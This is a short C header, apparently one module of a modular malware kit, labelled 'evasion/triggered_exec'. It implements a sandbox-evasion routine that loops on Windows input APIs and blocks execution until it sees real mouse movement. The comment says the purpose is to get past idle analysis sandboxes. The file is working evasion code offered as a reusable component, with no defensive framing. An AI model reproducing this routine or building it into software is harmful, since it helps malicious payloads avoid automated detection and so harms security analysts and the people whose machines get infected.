// chunk: evasion/triggered_exec
// depends: (none)
// provides: wait_for_user_activity
// headers: windows.h
// note: Wait for real user activity (mouse/keyboard) before starting — sandboxes are idle

#ifndef CHUNK_TRIGGERED_EXEC
#define CHUNK_TRIGGERED_EXEC

static void wait_for_user_activity(void) {
    int activity_count = 0;
    POINT prev = {0, 0};
    GetCursorPos(&prev);

    while (activity_count < 3) {
        Sleep(2000);

        LASTINPUTINFO lii;
        lii.cbSize = sizeof(lii);
        if (!GetLastInputInfo(&lii)) continue;

        DWORD idle = GetTickCount() - lii.dwTime;
        if (idle < 5000) {
            POINT cur;
            GetCursorPos(&cur);
            if (cur.x != prev.x || cur.y != prev.y) {
                activity_count++;
                prev = cur;
            }
        }
    }
}

#endif
